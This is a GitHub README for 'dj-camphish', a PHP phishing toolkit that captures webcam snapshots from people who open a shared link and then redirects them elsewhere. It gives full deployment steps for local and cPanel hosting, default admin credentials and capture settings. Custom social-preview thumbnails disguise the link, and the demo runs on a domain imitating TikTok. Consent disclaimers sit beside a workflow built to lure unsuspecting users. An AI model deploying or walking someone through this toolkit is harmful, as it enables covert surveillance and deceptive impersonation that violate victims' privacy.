<div align="center">
  <img src="https://github.com/rootuserdj/rootuserdj/blob/master/dj-camphish-logo.jpg" alt="dj-camphish Logo" width="200">
  <p><em>Simple Webcam Capture & Redirect Toolkit</em></p>
  <p>Built for ethical red teaming, OSINT, and privacy awareness demos</p>
</div>

<hr>

## 🚀 Overview

`dj-camphish` is an easy-to-use, browser-based toolkit for capturing webcam snapshots (with user permission) and redirecting users to a custom URL. It's designed for **ethical hacking labs**, **OSINT training**, and **privacy education**, with a simple admin panel to manage captures and settings. Perfect for beginners and pros alike!

**Important**: Always get user consent before capturing images. Use only in controlled, ethical environments.

---

## ✨ Features

- 📷 **Webcam Capture**: Takes snapshots with user permission.
- ⚙️ **Admin Panel**: View, delete, or download captures; set redirect URLs and thumbnails.
- 📱 **Responsive Design**: Works on mobile and desktop with a clean Tailwind CSS interface.
- 🔒 **Secure**: Built-in CSRF protection for safe admin actions.
- 🖼️ **Social Previews**: Add a custom thumbnail (1200x630) for link sharing.
- 🛠️ **Easy Setup**: Run locally (XAMPP) or on hosting (cPanel) without port forwarding.
- 🎯 **Beginner-Friendly**: No complex setup for noob users.
- 💾 **Image Management**: Save captures to server, delete, or download as ZIP.

---

## 📁 Project Structure

```
dj-camphish/
├── index.php                 # Capture page with loader & social meta tags
├── capture.js                # Webcam capture script
├── save.php                  # Saves images to server
├── config.php                # Settings for captures and security
├── gallery.php               # Admin panel (login: admin/12345)
├── delete_images.php         # Deletes selected images
├── download_images.php       # Downloads images (single or ZIP)
├── update_redirect.php       # Updates redirect URL & thumbnail
├── get_csrf_token.php        # Handles secure tokens
├── logout.php                # Logs out admins
├── redirect.txt              # Stores redirect URL
├── thumbnail.png             # Social media thumbnail (1200x630)
├── fallback.png              # Backup thumbnail
├── logs.txt                  # Logs errors and actions
└── captures/                 # Stores images (e.g., 68e8c7736e5de.png)
```

---

## 🚀 Quick Start

### 1. Run Locally (XAMPP)
No port forwarding needed! Use XAMPP for an easy local setup.

1. **Install XAMPP**:
   - Download XAMPP ([xampp.org](https://www.apachefriends.org/)) for Windows, macOS, or Linux.
   - Install and start Apache and PHP.

2. **Setup Project**:
   - Copy `dj-camphish` folder to `C:\xampp\htdocs\` (Windows) or `/opt/lampp/htdocs/` (Linux/macOS).
   - Set permissions (Linux/macOS):
     ```bash
     chmod 755 htdocs/dj-camphish/captures/
     chmod 644 htdocs/dj-camphish/redirect.txt htdocs/dj-camphish/logs.txt
     chmod 644 htdocs/dj-camphish/thumbnail.png htdocs/dj-camphish/fallback.png
     ```

3. **Access**:
   - Open `http://localhost/dj-camphish/` for capture page.
   - Go to `http://localhost/dj-camphish/gallery.php` for admin panel.
   - Login: **Username**: `admin`, **Password**: `12345`.

### 2. Deploy on Hosting (cPanel)
Host online without port forwarding using any PHP-compatible hosting.

1. **Upload Files**:
   - Log in to cPanel (e.g., via your hosting provider).
   - Go to File Manager → `public_html`.
   - Upload `dj-camphish` folder or ZIP and extract it.

2. **Set Permissions**:
   - In File Manager, set:
     - `captures/` folder: 755 (writeable).
     - `redirect.txt`, `logs.txt`, `thumbnail.png`, `fallback.png`: 644.

3. **Access**:
   - Capture page: `yourdomain.com/dj-camphish/`.
   - Admin panel: `yourdomain.com/dj-camphish/gallery.php` (login: admin/12345).
   - Demo: [https://tiktoks.wuaze.com/](https://tiktoks.wuaze.com/) | [https://tiktoks.wuaze.com/gallery.php](https://tiktoks.wuaze.com/gallery.php).

### 3. Usage
1. Share the capture URL (e.g., `https://tiktoks.wuaze.com/`).
2. User allows webcam → 3 snapshots taken (1.5s intervals) → saved to `captures/`.
3. User redirects to URL in `redirect.txt`.
4. Log in to `gallery.php` to view, delete, or download images.

---

## 📱 Screenshots

### 1. Capture Interface 
<div align="center">
  <img src="https://github.com/rootuserdj/rootuserdj/blob/master/captures.jpg" alt="Capture Interface" width="100%" style="max-width: 800px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
  <p><em>Simple loader with webcam consent prompt</em></p>
</div>

### 2. Admin Dashboard
<div align="center">
  <img src="https://github.com/rootuserdj/rootuserdj/blob/master/dj-camphish-captures.jpg" alt="Admin Dashboard" width="100%" style="max-width: 1200px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
  <p><em>Manage captures with delete/download options</em></p>
</div>

### 3. Settings Modal
<div align="center">
  <img src="https://github.com/rootuserdj/rootuserdj/blob/master/dj-camphish-modal.jpg" alt="Settings Modal" width="100%" style="max-width: 800px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
  <p><em>Update redirect URL and thumbnail (1200x630)</em></p>
</div>

---

## ⚙️ Configuration

- **No CSRF Changes Needed**: The default `csrf_secret` in `config.php` works out of the box.
- **Capture Settings** (`config.php`):
  ```php
  'capture' => [
      'max_captures' => 3,      // Number of snapshots
      'interval_ms' => 1500,    // Delay between snapshots (ms)
      'canvas_width' => 640,    // Image width
      'canvas_height' => 480,   // Image height
  ],
  ```
- **Admin Panel** (`gallery.php`):
  - Set redirect URL (e.g., `https://example.com`).
  - Upload thumbnail (1200x630 PNG/JPG) for social previews.
- **Logging**: Errors and actions saved to `logs.txt`.

---

## 🛡️ Security Tips

- **Change Password**: Update `admin/12345` in `config.php` for production.
- **Use HTTPS**: Deploy on a secure domain (e.g., `https://tiktoks.wuaze.com/`).
- **Permissions**: Ensure only `captures/` and logs are writeable.
- **Consent**: Always get user permission for webcam access.

---

## 🔧 Troubleshooting

| Issue | Solution |
|-------|----------|
| **Images not saving** | Check `captures/` permissions (`chmod 755`) |
| **Login fails** | Verify `admin/12345` in `config.php` |
| **Thumbnail missing** | Upload 1200x630 image via `gallery.php` |
| **Download issues** | Enable PHP `zip` extension in `php.ini` |

**Logs**: Check `logs.txt` for errors (e.g., CSRF or file issues).

---

## ⚖️ Legal Notice

> **⚠️ Ethical Use Only**: Use in **authorized environments** with explicit consent. Unauthorized webcam capture violates privacy laws (e.g., GDPR, CCPA). The author is not responsible for misuse.

---

## 👨‍💻 Contact

**Dhananjay Sah**  
📞 +977 9824204425  
✉️ [rootuserdj@gmail.com](mailto:rootuserdj@gmail.com)  
🌐 [GitHub](https://github.com/rootuserdj)

**Support**: Open an [issue](https://github.com/rootuserdj/dj-camphish/issues) for help.

---

## 📄 License

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Licensed under the [MIT License](LICENSE).

---

<div align="center">
  <img src="https://github.com/rootuserdj/rootuserdj/blob/master/dj-camphish-logo.jpg" alt="Built with Love" width="300">
  <p><em>Made with ❤️ by Dhananjay Sah | October 2025</em></p>
  ⭐ <a href="https://github.com/rootuserdj/dj-camphish/stargazers">Star on GitHub</a> ⭐
</div>
